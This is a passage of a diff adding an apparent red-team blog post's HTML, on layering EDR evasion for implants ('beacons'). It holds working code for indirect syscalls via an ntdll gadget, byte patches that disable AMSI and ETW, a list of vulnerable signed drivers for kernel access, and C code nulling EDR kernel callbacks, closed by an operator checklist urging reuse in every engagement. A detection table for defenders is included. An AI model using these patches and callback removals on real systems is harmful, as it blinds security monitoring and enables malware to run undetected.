+<span class="n">PBYTE</span> <span class="n">stub</span> <span class="o">=</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">ntdll</span><span class="p">,</span> <span class="s">"NtClose"</span><span class="p">);</span>
+<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">32</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">stub</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x0F</span> <span class="o">&amp;&amp;</span> <span class="n">stub</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x05</span> <span class="o">&amp;&amp;</span> <span class="n">stub</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0xC3</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">g_gadget</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)(</span><span class="n">stub</span> <span class="o">+</span> <span class="n">i</span><span class="p">);</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1">// Now calling indirect_syscall(...) invokes NtOpenProcess with the call</span>
+<span class="c1">// appearing (to the kernel) to originate from inside ntdll.</span>
+<span class="n">NTSTATUS</span> <span class="n">s</span> <span class="o">=</span> <span class="n">indirect_syscall</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hProc</span><span class="p">,</span> <span class="n">PROCESS_QUERY_INFORMATION</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oa</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cid</span><span class="p">);</span>
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button><span class="code-lang">c</span></pre></div></div>
+
+<p>This is the technique in <strong>SysWhispers3</strong>, <strong>FreshyCalls</strong>, and most mature loaders shipped in 2024-2026.</p>
+
+<h2 id="layer-4-amsi-and-etw-patching">Layer 4: AMSI and ETW Patching<a class="anchor-link" href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#layer-4-amsi-and-etw-patching" aria-label="Copy link to Layer 4: AMSI and ETW Patching"><span aria-hidden="true">#</span></a></h2>
+
+<p>Unhooking plus indirect syscalls defeats kernel callbacks on individual APIs - but if you’re running PowerShell or .NET tooling inside the beacon, each script/assembly is scanned by AMSI before execution. And every syscall you make emits ETW events. You patch both.</p>
+
+<h3 id="amsi-patch---4-bytes-ring-3">AMSI patch - 4 bytes, ring 3<a class="anchor-link" href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#amsi-patch---4-bytes-ring-3" aria-label="Copy link to AMSI patch - 4 bytes, ring 3"><span aria-hidden="true">#</span></a></h3>
+
+<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code><span class="c1">// C# version - load amsi.dll if not already, patch AmsiScanBuffer to return AMSI_RESULT_CLEAN (0)</span>
+<span class="n">IntPtr</span> <span class="n">amsi</span>   <span class="p">=</span> <span class="nf">LoadLibrary</span><span class="p">(</span><span class="s">"amsi.dll"</span><span class="p">);</span>
+<span class="n">IntPtr</span> <span class="n">target</span> <span class="p">=</span> <span class="nf">GetProcAddress</span><span class="p">(</span><span class="n">amsi</span><span class="p">,</span> <span class="s">"AmsiScanBuffer"</span><span class="p">);</span>
+
+<span class="kt">byte</span><span class="p">[]</span> <span class="n">patch</span> <span class="p">=</span> <span class="p">{</span> <span class="m">0x48</span><span class="p">,</span> <span class="m">0x31</span><span class="p">,</span> <span class="m">0xC0</span><span class="p">,</span> <span class="m">0xC3</span> <span class="p">};</span>  <span class="c1">// xor rax, rax ; ret</span>
+<span class="nf">VirtualProtect</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="p">(</span><span class="n">UIntPtr</span><span class="p">)</span><span class="n">patch</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span> <span class="m">0x40</span><span class="p">,</span> <span class="k">out</span> <span class="kt">uint</span> <span class="n">oldProt</span><span class="p">);</span>
+<span class="n">Marshal</span><span class="p">.</span><span class="nf">Copy</span><span class="p">(</span><span class="n">patch</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="n">patch</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
+<span class="nf">VirtualProtect</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="p">(</span><span class="n">UIntPtr</span><span class="p">)</span><span class="n">patch</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span> <span class="n">oldProt</span><span class="p">,</span> <span class="k">out</span> <span class="n">_</span><span class="p">);</span>
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button><span class="code-lang">csharp</span></pre></div></div>
+
+<p>Every subsequent <code class="language-plaintext highlighter-rouge">AmsiScanBuffer</code> call returns “clean” immediately. No content ever reaches the AV.</p>
+
+<h3 id="etw-patch---1-byte">ETW patch - 1 byte<a class="anchor-link" href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#etw-patch---1-byte" aria-label="Copy link to ETW patch - 1 byte"><span aria-hidden="true">#</span></a></h3>
+
+<p><code class="language-plaintext highlighter-rouge">EtwEventWrite</code> is the user-mode ETW entry point. Return early:</p>
+
+<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code><span class="n">IntPtr</span> <span class="n">etw</span> <span class="p">=</span> <span class="nf">GetProcAddress</span><span class="p">(</span><span class="nf">GetModuleHandle</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">),</span> <span class="s">"EtwEventWrite"</span><span class="p">);</span>
+<span class="nf">VirtualProtect</span><span class="p">(</span><span class="n">etw</span><span class="p">,</span> <span class="p">(</span><span class="n">UIntPtr</span><span class="p">)</span><span class="m">1</span><span class="p">,</span> <span class="m">0x40</span><span class="p">,</span> <span class="k">out</span> <span class="kt">uint</span> <span class="n">oldProt</span><span class="p">);</span>
+<span class="n">Marshal</span><span class="p">.</span><span class="nf">Copy</span><span class="p">(</span><span class="k">new</span> <span class="kt">byte</span><span class="p">[]</span> <span class="p">{</span> <span class="m">0xC3</span> <span class="p">},</span> <span class="m">0</span><span class="p">,</span> <span class="n">etw</span><span class="p">,</span> <span class="m">1</span><span class="p">);</span>  <span class="c1">// ret</span>
+<span class="nf">VirtualProtect</span><span class="p">(</span><span class="n">etw</span><span class="p">,</span> <span class="p">(</span><span class="n">UIntPtr</span><span class="p">)</span><span class="m">1</span><span class="p">,</span> <span class="n">oldProt</span><span class="p">,</span> <span class="k">out</span> <span class="n">_</span><span class="p">);</span>
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button><span class="code-lang">csharp</span></pre></div></div>
+
+<h3 id="ordering-matters">Ordering matters<a class="anchor-link" href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#ordering-matters" aria-label="Copy link to Ordering matters"><span aria-hidden="true">#</span></a></h3>
+
+<ul>
+  <li><strong>Patch AMSI/ETW BEFORE loading tooling.</strong> Once PowerShell has scanned a payload and reported it, it’s too late.</li>
+  <li><strong>Patch ETW before AMSI</strong> - because AMSI itself emits an ETW event on <code class="language-plaintext highlighter-rouge">AmsiScanBuffer</code> entry.</li>
+  <li><strong>Some environments revert patches.</strong> Sophos and CrowdStrike periodically re-check <code class="language-plaintext highlighter-rouge">AmsiScanBuffer</code> bytes. Use <strong>hardware breakpoint hooking</strong> of <code class="language-plaintext highlighter-rouge">AmsiScanBuffer</code> instead - no bytes modified, still returns clean.</li>
+</ul>
+
+<h2 id="layer-5-kernel-callback-removal-the-nuclear-option">Layer 5: Kernel Callback Removal (The Nuclear Option)<a class="anchor-link" href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#layer-5-kernel-callback-removal-the-nuclear-option" aria-label="Copy link to Layer 5: Kernel Callback Removal (The Nuclear Option)"><span aria-hidden="true">#</span></a></h2>
+
+<p>Everything above keeps the EDR’s userland components blind. But the EDR’s <strong>kernel driver</strong> still sees every process created, thread spawned, image loaded, handle opened - via the Object Manager callbacks it registered at boot.</p>
+
+<p>Removing those callbacks requires a read/write primitive in Ring 0. Most operators get it via a <strong>vulnerable signed driver</strong> (BYOVD):</p>
+
+<ul>
+  <li>Dell <code class="language-plaintext highlighter-rouge">dbutil.sys</code></li>
+  <li>MSI <code class="language-plaintext highlighter-rouge">RTCore64.sys</code></li>
+  <li>GIGABYTE <code class="language-plaintext highlighter-rouge">gdrv.sys</code></li>
+  <li>Intel <code class="language-plaintext highlighter-rouge">iqvw64e.sys</code> / <code class="language-plaintext highlighter-rouge">NAL</code></li>
+</ul>
+
+<p>The driver exposes an arbitrary kernel read/write primitive via IOCTL. From a userland application, open a handle to the driver, issue IOCTLs to:</p>
+
+<ol>
+  <li>Locate <code class="language-plaintext highlighter-rouge">PspCreateProcessNotifyRoutineEx</code> (undocumented, found via pattern scan or offset from <code class="language-plaintext highlighter-rouge">PsSetCreateProcessNotifyRoutineEx</code>).</li>
+  <li>Walk the 64-entry callback array.</li>
+  <li>Resolve each callback’s target driver name.</li>
+  <li>NULL-out the entries belonging to the EDR driver.</li>
+</ol>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code><span class="c1">// Simplified - real implementation needs to handle ExFastRef tagging on the pointers</span>
+<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">64</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">PVOID</span> <span class="n">slot</span> <span class="o">=</span> <span class="n">KernelRead</span><span class="p">(</span><span class="n">callbackArray</span> <span class="o">+</span> <span class="n">i</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">));</span>
+    <span class="n">PVOID</span> <span class="n">callback</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="n">ULONG_PTR</span><span class="p">)</span><span class="n">slot</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xFULL</span><span class="p">);</span>  <span class="c1">// strip ExFastRef flags</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">callback</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
+
+    <span class="kt">char</span> <span class="n">driverName</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+    <span class="n">ResolveDriverName</span><span class="p">(</span><span class="n">callback</span><span class="p">,</span> <span class="n">driverName</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">driverName</span><span class="p">));</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">driverName</span><span class="p">,</span> <span class="s">"edrdrv.sys"</span><span class="p">)</span> <span class="o">||</span> <span class="n">strstr</span><span class="p">(</span><span class="n">driverName</span><span class="p">,</span> <span class="s">"crowdstrike"</span><span class="p">))</span> <span class="p">{</span>
+        <span class="n">KernelWrite</span><span class="p">(</span><span class="n">callbackArray</span> <span class="o">+</span> <span class="n">i</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>  <span class="c1">// blind it</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button><span class="code-lang">c</span></pre></div></div>
+
+<p>The same trick works for:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">PspLoadImageNotifyRoutine</code> (DLL load visibility)</li>
+  <li><code class="language-plaintext highlighter-rouge">PspCreateThreadNotifyRoutine</code> (thread creation)</li>
+  <li><code class="language-plaintext highlighter-rouge">CallbackListHead</code> of <code class="language-plaintext highlighter-rouge">ObRegisterCallbacks</code> targets (handle operations)</li>
+</ul>
+
+<h3 id="the-catch">The catch<a class="anchor-link" href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#the-catch" aria-label="Copy link to The catch"><span aria-hidden="true">#</span></a></h3>
+
+<ul>
+  <li><strong>HVCI / VBS</strong> prevents unsigned kernel code - you can still issue IOCTLs to a signed driver you loaded, but you can’t load your own rootkit.</li>
+  <li><strong>PatchGuard / KPP</strong> periodically validates SSDT, IDT, and select structures. Callback arrays aren’t formally in the protected set, but Windows 11 24H2 tightened this significantly.</li>
+  <li><strong>Microsoft’s vulnerable driver blocklist</strong> (HVCI-enforced in 11 24H2+) makes the historically reliable BYOVD drivers unusable on modern systems.</li>
+  <li><strong>Loud</strong>: loading a kernel driver generates an Event 6 in the System log that every SOC should alert on.</li>
+</ul>
+
+<p>Use this as a last resort - after userland evasion has been fully exhausted and you need to hide from a specific EDR you know you can’t beat otherwise.</p>
+
+<h2 id="what-the-defender-actually-sees">What the Defender Actually Sees<a class="anchor-link" href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#what-the-defender-actually-sees" aria-label="Copy link to What the Defender Actually Sees"><span aria-hidden="true">#</span></a></h2>
+
+<p>Detection engineers don’t need to block every layer - they need to detect <em>any</em> of them. A well-instrumented environment picks up:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Layer</th>
+      <th>Detection vector</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Disk mapping of ntdll</td>
+      <td>File-access event 4663 on <code class="language-plaintext highlighter-rouge">ntdll.dll</code> from a non-system process</td>
+    </tr>
+    <tr>
+      <td>KnownDlls mapping</td>
+      <td><code class="language-plaintext highlighter-rouge">NtOpenSection</code> on <code class="language-plaintext highlighter-rouge">\KnownDlls\ntdll.dll</code> from userland is rare enough to baseline</td>
+    </tr>
+    <tr>
+      <td>Suspended donor process</td>
+      <td>Short-lived <code class="language-plaintext highlighter-rouge">notepad.exe</code> + <code class="language-plaintext highlighter-rouge">ReadProcessMemory</code> pattern</td>
+    </tr>
+    <tr>
+      <td>Hell’s Gate family</td>
+      <td>Syscall from a non-ntdll return address (kernel instrumentation)</td>
+    </tr>
+    <tr>
+      <td>Indirect syscalls</td>
+      <td>Stack walk shows a call from non-ntdll module just before the gadget</td>
+    </tr>
+    <tr>
+      <td>AMSI patch</td>
+      <td>Byte hash of <code class="language-plaintext highlighter-rouge">AmsiScanBuffer</code> deviates from baseline</td>
+    </tr>
+    <tr>
+      <td>ETW patch</td>
+      <td>ETW events suddenly stop from a running process</td>
+    </tr>
+    <tr>
+      <td>Kernel callback removal</td>
+      <td>Driver load event (6/7045) + callback array integrity check fails</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>The operator’s job is to minimize each of these. The defender’s job is to monitor enough of them that skipping one leaves another still visible. Mature engagements turn into a choreography where both sides know the moves - and the winner is whoever executed the prep better.</p>
+
+<h2 id="recommended-operator-order">Recommended Operator Order<a class="anchor-link" href="https://robinx0.github.io/blogs/edr-bypass/userland-edr-bypass-stack/#recommended-operator-order" aria-label="Copy link to Recommended Operator Order"><span aria-hidden="true">#</span></a></h2>
+
+<p>In practice, every beacon should do this on load, in this exact sequence, before running any capability:</p>
+
+<ol>
+  <li><strong>Disable ETW</strong> (1-byte patch, or HWBP)</li>
+  <li><strong>Disable AMSI</strong> (4-byte patch, or HWBP)</li>
+  <li><strong>Restore ntdll</strong> via KnownDlls section (cleanest)</li>
+  <li><strong>Set up Halo’s Gate</strong> for every syscall you’ll make</li>
+  <li><strong>Execute capabilities</strong> using indirect syscalls</li>
+  <li><strong>Kernel callback removal</strong> only if you confirmed the EDR is one that requires it (e.g. CrowdStrike on a hardened workstation)</li>
+</ol>
+
+<p>Implement once, ship as a reusable BOF library, chain into every engagement. The days of “direct syscalls and you’re fine” are over; in 2026 you need the full stack.</p>
+
+<blockquote>
+  <p>EDR bypass isn’t a trick. It’s a set of maintenance activities you perform on your own process, every time, to keep it behaving like the kind of process the defender expects to see.</p>
+</blockquote>
+
+    </div>
+
+    
+
+    
+    <section class="related">
+      <div class="label" style="margin-bottom:14px">Continue · Edr bypass</div>
+      <div class="related-grid">
+        
+          
+          <a href="https://robinx0.github.io/blogs/edr-bypass/hardware-breakpoint-hooking/" class="related-card">
+            <span class="related-date">Apr 14, 2026</span>
+            <span class="related-t">Hardware Breakpoint Hooking: Bypassing Inline EDR Hooks Without Touching Memory</span>
+            <span class="related-desc">A practical C++ guide to using x86-64 debug registers (DR0-DR7) for user-mode API hooki...</span>
+            
+              <span class="wu-diff insane" style="align-self:flex-start">ELITE</span>
+            
+          </a>
+        
+          
+          <a href="https://robinx0.github.io/blogs/edr-bypass/sleep-obfuscation-techniques/" class="related-card">
+            <span class="related-date">Mar 29, 2026</span>
+            <span class="related-t">Sleep Obfuscation Deep Dive: Ekko, Zilean, and Foliage</span>
+            <span class="related-desc">Advanced sleep obfuscation techniques that encrypt implant memory during sleep cycles t...</span>
+            
+              <span class="wu-diff hard" style="align-self:flex-start">HARD</span>
+            
+          </a>
+        
+          
+          <a href="https://robinx0.github.io/blogs/edr-bypass/stack-spoofing-techniques/" class="related-card">
+            <span class="related-date">Mar 25, 2026</span>
+            <span class="related-t">Call Stack Spoofing: Defeating EDR Stack Telemetry</span>
+            <span class="related-desc">Advanced techniques for spoofing thread call stacks to evade EDR behavioral detection -...</span>
+            
+              <span class="wu-diff hard" style="align-self:flex-start">HARD</span>
+            
+          </a>
+        
+      </div>
+    </section>
+    
+
+    
+    
+    
+
+    <div class="article-foot">
+      <a href="https://robinx0.github.io/" class="btn-g">← Home</a>
+      <a href="https://robinx0.github.io/writeups?cat=Edr+bypass" class="btn-g">More Edr bypass →</a>
+    </div>
+  </div>
+</article>
+
+    </div>
+
+    
+
+  </main>
+
+  
+
+  <!-- Image lightbox -->
+  <div class="lightbox-overlay" id="lightbox">
+    <button class="lightbox-close" type="button" aria-label="Close lightbox">×</button>
+    <button class="lightbox-nav lightbox-prev" type="button" aria-label="Previous image">‹</button>
+    <button class="lightbox-nav lightbox-next" type="button" aria-label="Next image">›</button>
+    <img class="lightbox-img" id="lightbox-img" alt="">
+    <div class="lightbox-caption mono" id="lightbox-caption"></div>
+  </div>
+
+  
+
+
+</body></html>
